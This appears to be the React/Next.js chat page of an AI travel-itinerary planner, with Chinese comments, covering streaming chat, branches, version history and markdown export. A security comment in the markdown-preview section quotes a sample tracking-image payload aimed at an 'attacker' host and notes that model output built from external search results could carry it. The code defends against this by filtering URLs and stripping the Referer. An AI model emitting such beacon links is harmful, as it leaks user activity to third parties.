"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useParams } from "next/navigation";
import Link from "next/link";
import {
  Download,
  GitBranch,
  Loader2,
  Pencil,
  Send,
  Sparkles,
  Undo2,
} from "lucide-react";
import ReactMarkdown from "react-markdown";
import { ItineraryPanel } from "@/components/itinerary-panel";

import { Badge, Button, Card, ErrorBanner, Spinner } from "@/components/ui";
import { api, ApiError, chatStream } from "@/lib/api";
import {
  readChatDraft,
  saveChatDraft,
  type ChatAttempt,
} from "@/lib/chat-draft";
import type {
  BranchInfo,
  ChatClarification,
  DetailLevel,
  SessionDetail,
  VersionDetail,
  VersionInfo,
} from "@/lib/types";
import { DETAIL_LEVEL_LABELS } from "@/lib/types";
import { cn, relativeTime } from "@/lib/utils";

interface Message {
  role: "user" | "assistant";
  content: string;
}

export default function ChatPage() {
  const params = useParams<{ sessionId: string }>();
  const sessionId = params.sessionId;

  const [detail, setDetail] = useState<SessionDetail | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [activeBranchId, setActiveBranchId] = useState<string | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [versionDetail, setVersionDetail] = useState<VersionDetail | null>(
    null,
  );
  const [input, setInput] = useState("");
  const [draftBranch, setDraftBranch] = useState<string | null>(null);
  const [failedRequest, setFailedRequest] = useState<ChatAttempt | null>(null);
  const [sendFailure, setSendFailure] = useState<{
    message: string;
    code: string;
  } | null>(null);
  const [clarification, setClarification] = useState<ChatClarification | null>(
    null,
  );
  // 会话标题行内编辑
  const [editingTitle, setEditingTitle] = useState(false);
  // 流式：当前阶段提示 / 正在逐字生成的路书 / 过程中的提示
  const [progress, setProgress] = useState<string | null>(null);
  const [streamingPlan, setStreamingPlan] = useState("");
  const [notices, setNotices] = useState<string[]>([]);
  const [level, setLevel] = useState<DetailLevel>("L2_standard");
  const [sending, setSending] = useState(false);
  const [itineraryBusy, setItineraryBusy] = useState(false);
  const bottomRef = useRef<HTMLDivElement>(null);
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  /** 输入框随内容自动增高（上限约 6 行，超出后内部滚动）。 */
  const autoGrow = useCallback(() => {
    const el = textareaRef.current;
    if (!el) return;
    el.style.height = "auto";
    el.style.height = `${Math.min(el.scrollHeight, 160)}px`;
  }, []);

  const activeBranch = useMemo(
    () => detail?.branches.find((b) => b.id === activeBranchId) ?? null,
    [detail, activeBranchId],
  );
  const versions: VersionInfo[] = useMemo(
    () => (activeBranchId ? (detail?.versions[activeBranchId] ?? []) : []),
    [detail, activeBranchId],
  );

  const load = useCallback(async () => {
    setError(null);
    try {
      const data = await api.getSession(sessionId);
      setDetail(data);
      const primary =
        data.branches.find((b) => b.is_primary) ?? data.branches[0];
      setActiveBranchId((prev) => prev ?? primary?.id ?? null);
    } catch (err) {
      setError(err instanceof Error ? err.message : "加载会话失败");
    }
  }, [sessionId]);

  /** 提交会话改名；空标题视为取消。 */
  async function commitTitle(rawTitle: string) {
    setEditingTitle(false);
    const title = rawTitle.trim();
    if (!title || title === detail?.session.title) return;
    try {
      await api.updateSession(sessionId, { title });
      await load();
    } catch (err) {
      setError(err instanceof Error ? err.message : "重命名失败");
    }
  }

  useEffect(() => {
    void load();
  }, [load]);

  useEffect(() => {
    if (!activeBranchId) return;
    const draft = readChatDraft(activeBranchId);
    setInput(draft.input);
    setFailedRequest(draft.attempt);
    setSendFailure(
      draft.attempt
        ? {
            message:
              "上次发送未确认完成，可以重试这条消息，系统会核对已保存结果。",
            code: "UNCONFIRMED",
          }
        : null,
    );
    setDraftBranch(activeBranchId);
  }, [activeBranchId]);

  useEffect(() => {
    autoGrow();
  }, [input, autoGrow]);

  // 切换分支时：载入该分支的对话历史与最新版本路书
  //
  // 注意「对话历史」这一步曾经缺失 —— 后端一直有存（LangGraph checkpoint），
  // 但前端没读回来，于是用户刷新页面就看到一个空对话，像是数据丢了。
  useEffect(() => {
    if (!activeBranchId) return;
    let cancelled = false;
    setClarification(null);

    void api
      .getMessages(activeBranchId)
      .then((result) => {
        if (cancelled) return;
        setClarification(result.clarification ?? null);
        setMessages(
          result.messages.map((m) => ({
            role: m.role === "user" ? "user" : "assistant",
            content: m.content,
          })),
        );
      })
      .catch(() => {
        if (!cancelled) setMessages([]);
      });

    const list = detail?.versions[activeBranchId] ?? [];
    const latest = list[list.length - 1];
    if (!latest) {
      setVersionDetail(null);
    } else {
      void api
        .getVersion(latest.id)
        .then((data) => {
          if (!cancelled) setVersionDetail(data);
        })
        .catch(() => {
          if (!cancelled) setVersionDetail(null);
        });
    }

    return () => {
      cancelled = true;
    };
  }, [detail, activeBranchId]);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, sending]);

  async function send(override?: string, retry?: ChatAttempt) {
    const text = (override ?? input).trim();
    if (
      !text ||
      !activeBranchId ||
      draftBranch !== activeBranchId ||
      sending ||
      itineraryBusy
    )
      return;
    const attempt =
      retry ??
      (failedRequest?.message === text
        ? failedRequest
        : {
            message: text,
            request_id: crypto.randomUUID(),
            detail_level: level,
          });
    const clearInput =
      override === undefined || (retry && input.trim() === retry.message);
    const remainingInput = clearInput ? "" : input;
    if (!retry)
      setMessages((prev) => [...prev, { role: "user", content: text }]);
    setInput(remainingInput);
    setSendFailure(null);
    setFailedRequest(null);
    saveChatDraft(activeBranchId, remainingInput, attempt);

    // 发送后把输入框收回一行高度
    if (clearInput)
      requestAnimationFrame(() => {
        if (textareaRef.current) textareaRef.current.style.height = "auto";
      });
    setSending(true);
    setProgress(null);
    setStreamingPlan("");
    setNotices([]);

    let reply = "";
    let finalPlan = "";
    try {
      // 流式：进度与增量文本实时显示，避免 30~40 秒一直干等
      await chatStream(
        {
          ...attempt,
          session_id: sessionId,
          branch_id: activeBranchId,
        },
        {
          onProgress: (message) => setProgress(message),
          onNotice: (message) => setNotices((prev) => [...prev, message]),
          onToken: (piece) => {
            // 开始出文本时就撤掉「正在撰写」的提示，改看正文
            setProgress(null);
            finalPlan += piece;
            setStreamingPlan(finalPlan);
          },
          onDone: (result) => {
            setClarification(result.clarification ?? null);
            reply = result.reply;
            finalPlan = result.plan || finalPlan;
          },
        },
      );

      setMessages((prev) => [
        ...prev,
        { role: "assistant", content: reply || "（无回复内容）" },
      ]);
      saveChatDraft(activeBranchId, remainingInput, null);
      await load();
    } catch (err) {
      const restored = clearInput ? text : input;
      setInput(restored);
      setFailedRequest(attempt);
      setSendFailure({
        message: err instanceof Error ? err.message : "发送失败，输入已保留。",
        code: err instanceof ApiError ? err.code : "UNKNOWN",
      });
      saveChatDraft(activeBranchId, restored, attempt);
      await load();
    } finally {
      setSending(false);
      setProgress(null);
      // 稍后清空流式正文：等 load() 把正式版本渲染出来再撤，避免闪一下空白
      setTimeout(() => setStreamingPlan(""), 300);
    }
  }

  async function forkFromVersion(version: VersionInfo) {
    const title = window.prompt("新分支的名称", `分支 ${version.seq}`);
    if (!title) return;
    try {
      await api.createBranch(sessionId, {
        title,
        parent_branch_id: version.branch_id,
        fork_version_id: version.id,
      });
      await load();
    } catch (err) {
      setError(err instanceof Error ? err.message : "创建分支失败");
    }
  }

  if (error && !detail) {
    return (
      <div className="mx-auto max-w-2xl px-5 py-10">
        <ErrorBanner message={error} onRetry={load} />
      </div>
    );
  }

  if (!detail) {
    return (
      <div className="mx-auto max-w-2xl px-5 py-10">
        <Spinner label="正在加载会话…" />
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-[1400px] px-4 py-5">
      {/* 顶部：会话标题 + 分支切换 */}
      <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
        <div>
          {editingTitle ? (
            <input
              autoFocus
              defaultValue={detail.session.title}
              className="rounded-md border border-brand-300 px-2 py-1 text-lg font-bold outline-none focus:ring-2 focus:ring-brand-100"
              onBlur={(e) => void commitTitle(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter") e.currentTarget.blur();
                if (e.key === "Escape") setEditingTitle(false);
              }}
            />
          ) : (
            <h1 className="flex items-center gap-2 text-lg font-bold">
              {detail.session.title}
              <button
                className="text-slate-300 transition hover:text-brand-500"
                title="重命名这个旅行"
                onClick={() => setEditingTitle(true)}
              >
                <Pencil className="h-3.5 w-3.5" />
              </button>
            </h1>
          )}
          <p className="text-xs text-slate-400">
            {detail.branches.length} 个分支 · 版本历史可随时回退
          </p>
        </div>
        <div className="flex flex-wrap items-center gap-2">
          {detail.branches.map((branch: BranchInfo) => (
            <button
              key={branch.id}
              disabled={sending || itineraryBusy}
              onClick={() => setActiveBranchId(branch.id)}
              className={cn(
                "rounded-full border px-3 py-1 text-xs transition",
                branch.id === activeBranchId
                  ? "border-transparent bg-gradient-to-r from-brand-500 to-teal-500 font-semibold text-white"
                  : "border-slate-200 bg-white text-slate-600 hover:border-brand-300",
              )}
            >
              {branch.title}
              {branch.is_primary && " ★"}
            </button>
          ))}
          <Link href="/compare">
            <Button size="sm">
              <GitBranch className="h-3.5 w-3.5" />
              对比分支
            </Button>
          </Link>
        </div>
      </div>

      <div className="grid items-start gap-4 lg:grid-cols-[minmax(280px,340px)_minmax(0,1fr)]">
        <div className="min-w-0 lg:sticky lg:top-20">
          {/* ---------------- 对话 ---------------- */}
          <Card className="flex flex-col overflow-hidden">
            <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50 px-3.5 py-2.5">
              <span className="text-xs font-bold text-slate-500">对话</span>
              {activeBranch && (
                <Badge tone={activeBranch.is_primary ? "brand" : "teal"}>
                  {activeBranch.title}
                </Badge>
              )}
            </div>

            <div className="max-h-[460px] min-h-[300px] flex-1 space-y-3 overflow-y-auto p-4">
              {messages.length === 0 && (
                <div className="rounded-lg bg-slate-50 px-4 py-3 text-xs leading-relaxed text-slate-500">
                  告诉我你的旅行想法即可，例如：
                  <br />
                  「我想去重庆玩 3 天，从北京出发，预算 2000」
                  <br />
                  我会先问清楚必要信息，再联网检索真实资料生成路书。
                </div>
              )}

              {messages.map((message, index) => (
                <div
                  key={index}
                  className={cn(
                    "flex gap-2.5",
                    message.role === "user" && "flex-row-reverse",
                  )}
                >
                  <div
                    className={cn(
                      "flex h-7 w-7 flex-none items-center justify-center rounded-lg text-xs font-bold",
                      message.role === "user"
                        ? "bg-slate-200 text-slate-600"
                        : "bg-gradient-to-br from-brand-500 to-teal-500 text-white",
                    )}
                  >
                    {message.role === "user" ? "我" : "AI"}
                  </div>
                  <div
                    className={cn(
                      "animate-fade-up max-w-[85%] whitespace-pre-wrap rounded-xl px-3.5 py-2 text-sm",
                      message.role === "user"
                        ? "bg-brand-100 text-brand-900"
                        : "bg-slate-50 text-slate-700",
                    )}
                  >
                    {message.content}
                  </div>
                </div>
              ))}

              {notices.map((notice) => (
                <div
                  key={notice}
                  className="rounded-lg bg-amber-50 px-3 py-2 text-xs text-amber-700"
                >
                  ⚠️ {notice}
                </div>
              ))}

              {sending && (
                <div className="flex items-center gap-2 text-xs text-brand-600">
                  <Loader2 className="h-3.5 w-3.5 animate-spin" />
                  {progress ?? "正在处理…"}
                </div>
              )}
              <div ref={bottomRef} />
            </div>

            <div className="border-t border-slate-100 bg-slate-50 p-3">
              {sendFailure && (
                <div
                  role="alert"
                  aria-label="消息发送未完成"
                  className="mb-3 rounded-lg border border-red-200 bg-red-50 p-3 text-xs leading-6 text-red-800"
                >
                  <p>{sendFailure.message}</p>
                  <div className="mt-1 flex flex-wrap gap-3">
                    {failedRequest && (
                      <button
                        type="button"
                        disabled={sending || itineraryBusy}
                        className="underline disabled:opacity-40"
                        onClick={() =>
                          void send(failedRequest.message, failedRequest)
                        }
                      >
                        重试这条消息
                      </button>
                    )}
                    {/LLM_AUTH|CONFIG_INVALID/.test(sendFailure.code) && (
                      <Link href="/settings" className="underline">
                        检查模型设置
                      </Link>
                    )}
                  </div>
                </div>
              )}
              {clarification && (
                <div
                  role="status"
                  aria-label="待补充的信息"
                  className="mb-3 rounded-lg border border-amber-200 bg-amber-50 p-3 text-xs leading-6 text-amber-900"
                >
                  <p className="whitespace-pre-wrap break-words">
                    {clarification.prompt}
                  </p>
                  {clarification.options &&
                    clarification.options.length > 0 && (
                      <div
                        role="group"
                        aria-label={
                          clarification.kind === "expense"
                            ? "消费记录选择"
                            : "地点候选选择"
                        }
                        className="my-2 grid max-h-64 min-w-0 gap-2 overflow-y-auto"
                      >
                        {clarification.options.map((option) => (
                          <button
                            key={option.reply}
                            type="button"
                            disabled={sending || itineraryBusy}
                            className="rounded-lg border border-amber-200 bg-white px-3 py-2 text-left leading-5 break-words hover:border-amber-400 disabled:opacity-40"
                            onClick={() => void send(option.reply)}
                          >
                            {option.label}
                          </button>
                        ))}
                      </div>
                    )}
                  <button
                    type="button"
                    disabled={sending || itineraryBusy}
                    className="mt-1 text-amber-800 underline disabled:opacity-40"
                    onClick={() => void send("取消这次操作")}
                  >
                    取消这次操作
                  </button>
                </div>
              )}
              <div className="flex items-end gap-2">
                <textarea
                  ref={textareaRef}
                  rows={1}
                  className="max-h-40 min-h-[38px] flex-1 resize-none rounded-lg border border-slate-200 bg-white px-3 py-2 text-sm leading-relaxed outline-none transition focus:border-brand-400 focus:ring-2 focus:ring-brand-100"
                  placeholder="说出你的想法，或回复「确认」定稿…"
                  aria-label="旅行对话输入"
                  value={input}
                  onChange={(e) => {
                    setInput(e.target.value);
                    if (activeBranchId)
                      saveChatDraft(
                        activeBranchId,
                        e.target.value,
                        failedRequest,
                      );
                    autoGrow();
                  }}
                  onKeyDown={(e) => {
                    // Enter 发送、Shift+Enter 换行；输入法组合中（如中文候选）不触发发送
                    if (
                      e.key === "Enter" &&
                      !e.shiftKey &&
                      !e.nativeEvent.isComposing
                    ) {
                      e.preventDefault();
                      void send();
                    }
                  }}
                  disabled={
                    sending || itineraryBusy || draftBranch !== activeBranchId
                  }
                />
                <Button
                  variant="primary"
                  loading={sending}
                  disabled={itineraryBusy || draftBranch !== activeBranchId}
                  onClick={() => void send()}
                >
                  <Send className="h-3.5 w-3.5" />
                  发送
                </Button>
              </div>
              <div className="mt-1.5 flex justify-between px-1 text-[11px] text-slate-400">
                <span>Enter 发送 · Shift+Enter 换行</span>
                <span
                  className={input.length > 4000 ? "text-red-500" : undefined}
                >
                  {input.length} / 4000
                </span>
              </div>
            </div>
          </Card>
        </div>
        <div className="min-w-0">
          {versionDetail ? (
            <ItineraryPanel
              key={versionDetail.version.branch_id}
              detail={versionDetail}
              editable={
                versions[versions.length - 1]?.id === versionDetail.version.id
              }
              disabled={sending || itineraryBusy}
              onBusy={setItineraryBusy}
              onUpdate={async (updated) => {
                await load();
                setVersionDetail(updated);
              }}
              onFork={() => forkFromVersion(versionDetail.version)}
              onAsk={(message) => void send(message)}
            />
          ) : (
            <Card className="min-h-[400px] overflow-hidden p-6 sm:p-10">
              <div className="flex h-full flex-col justify-center">
                <Sparkles className="mb-5 h-9 w-9 text-teal-500" />
                <p className="text-xs font-medium tracking-widest text-teal-600">
                  从一句想法开始
                </p>
                <h2 className="mt-3 text-2xl font-bold leading-relaxed text-slate-800">
                  聊聊你想怎样旅行，
                  <br />
                  剩下的我来串起来。
                </h2>
                <p className="mt-4 max-w-md text-sm leading-7 text-slate-500">
                  可以告诉我目的地、时间和偏好；还没想好去哪，也可以让我先推荐几个城市。
                </p>
                <div className="mt-7 flex flex-wrap gap-2 text-xs text-slate-500">
                  {["聊偏好", "选城市", "定地点", "串路线", "完整计划"].map(
                    (step) => (
                      <span
                        key={step}
                        className="rounded-full bg-teal-50 px-3 py-2 text-teal-700"
                      >
                        {step}
                      </span>
                    ),
                  )}
                </div>
              </div>
            </Card>
          )}{" "}
        </div>
      </div>

      <details className="mt-5 rounded-xl border border-slate-200 bg-white p-4">
        <summary className="cursor-pointer text-sm font-medium text-slate-600">
          完整计划书、导出与版本历史
        </summary>
        <div className="mt-4 grid gap-4 lg:grid-cols-[220px_minmax(0,1fr)]">
          {/* ---------------- 版本树 ---------------- */}
          <Card className="overflow-hidden">
            <div className="border-b border-slate-100 bg-slate-50 px-3.5 py-2.5 text-xs font-bold text-slate-500">
              版本历史（{versions.length}）
            </div>
            <div className="max-h-[540px] overflow-y-auto p-3">
              {versions.length === 0 ? (
                <p className="px-1 py-3 text-xs text-slate-400">
                  还没有版本，先发一条消息吧
                </p>
              ) : (
                <ol className="relative ml-1.5 border-l border-slate-200">
                  {[...versions].reverse().map((version) => (
                    <li key={version.id} className="relative mb-3 pl-4">
                      <span
                        className={cn(
                          "absolute -left-[5px] top-1.5 h-2.5 w-2.5 rounded-full border-2 border-white",
                          version.id === versionDetail?.version.id
                            ? "bg-brand-500"
                            : "bg-slate-300",
                        )}
                      />
                      <button
                        className="block w-full rounded-lg px-2 py-1 text-left transition hover:bg-slate-50"
                        disabled={sending || itineraryBusy}
                        onClick={() =>
                          void api.getVersion(version.id).then(setVersionDetail)
                        }
                      >
                        <span className="text-[11px] font-bold text-brand-600">
                          v{version.seq}
                        </span>
                        <span className="mt-0.5 block text-xs text-slate-600">
                          {version.summary}
                        </span>
                        <span className="text-[10px] text-slate-300">
                          {relativeTime(version.created_at)}
                        </span>
                      </button>
                      <button
                        className="mt-1 ml-2 flex items-center gap-1 text-[10px] text-slate-400 hover:text-brand-600"
                        disabled={sending || itineraryBusy}
                        onClick={() => forkFromVersion(version)}
                        title="从该版本新建分支"
                      >
                        <Undo2 className="h-3 w-3" />
                        从这里分叉
                      </button>
                    </li>
                  ))}
                </ol>
              )}
            </div>
          </Card>
          {/* ---------------- 路书 ---------------- */}
          <Card className="flex flex-col overflow-hidden">
            <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50 px-3.5 py-2.5">
              <span className="text-xs font-bold text-slate-500">
                路书预览
                {versionDetail && (
                  <span className="ml-2 font-normal text-slate-400">
                    v{versionDetail.version.seq} ·{" "}
                    {versionDetail.markdown.length} 字
                  </span>
                )}
              </span>
              <select
                className="rounded-md border border-slate-200 bg-white px-2 py-1 text-[11px]"
                value={level}
                onChange={(e) => setLevel(e.target.value as DetailLevel)}
              >
                {(Object.keys(DETAIL_LEVEL_LABELS) as DetailLevel[]).map(
                  (key) => (
                    <option key={key} value={key}>
                      {DETAIL_LEVEL_LABELS[key]}档
                    </option>
                  ),
                )}
              </select>
            </div>

            <div className="max-h-[460px] min-h-[300px] flex-1 overflow-y-auto p-4">
              {streamingPlan ? (
                // 流式生成中：先把已到达的正文显示出来，让用户看到「正在写」
                <div className="prose-report">
                  <ReactMarkdown>{streamingPlan}</ReactMarkdown>
                  <span className="ml-0.5 inline-block h-4 w-1.5 animate-pulse bg-brand-400 align-text-bottom" />
                </div>
              ) : versionDetail?.markdown ? (
                <div className="prose-report">
                  <ReactMarkdown
                    // 安全：路书内容来自模型 + 外部检索结果，可能被注入
                    // `![](http://attacker/beacon?d=...)` 这类埋点图片。
                    // 这里①只放行 http(s) 协议；②图片不发送 Referer，
                    // 避免把「谁在何时打开了这份路书」泄漏给第三方。
                    urlTransform={(url) =>
                      /^https?:\/\//i.test(url) ? url : ""
                    }
                    components={{
                      img: ({ node, ...props }) => (
                        // eslint-disable-next-line @next/next/no-img-element
                        <img
                          {...props}
                          referrerPolicy="no-referrer"
                          loading="lazy"
                          alt=""
                        />
                      ),
                      a: ({ node, ...props }) => (
                        <a
                          {...props}
                          target="_blank"
                          rel="noopener noreferrer nofollow"
                        />
                      ),
                    }}
                  >
                    {versionDetail.markdown}
                  </ReactMarkdown>
                </div>
              ) : (
                <div className="flex h-full flex-col items-center justify-center gap-2 text-center text-xs text-slate-400">
                  <Sparkles className="h-7 w-7 text-slate-300" />
                  路书生成后显示在这里
                </div>
              )}
            </div>

            <div className="flex flex-wrap items-center gap-2 border-t border-slate-100 bg-slate-50 p-3">
              {versionDetail ? (
                <>
                  <a href={api.exportUrl(versionDetail.version.id, "md")}>
                    <Button size="sm">
                      <Download className="h-3.5 w-3.5" />
                      导出 Markdown
                    </Button>
                  </a>
                  <a href={api.exportUrl(versionDetail.version.id, "html")}>
                    <Button size="sm">
                      <Download className="h-3.5 w-3.5" />
                      导出 HTML
                    </Button>
                  </a>
                  {versionDetail.citations.length > 0 && (
                    <span className="text-[11px] text-slate-400">
                      {versionDetail.citations.length} 个来源
                    </span>
                  )}
                </>
              ) : (
                <span className="text-[11px] text-slate-400">
                  暂无内容可导出
                </span>
              )}
            </div>
          </Card>{" "}
        </div>
      </details>

      {error && (
        <div className="mt-4">
          <ErrorBanner message={error} onRetry={load} />
        </div>
      )}
    </div>
  );
}
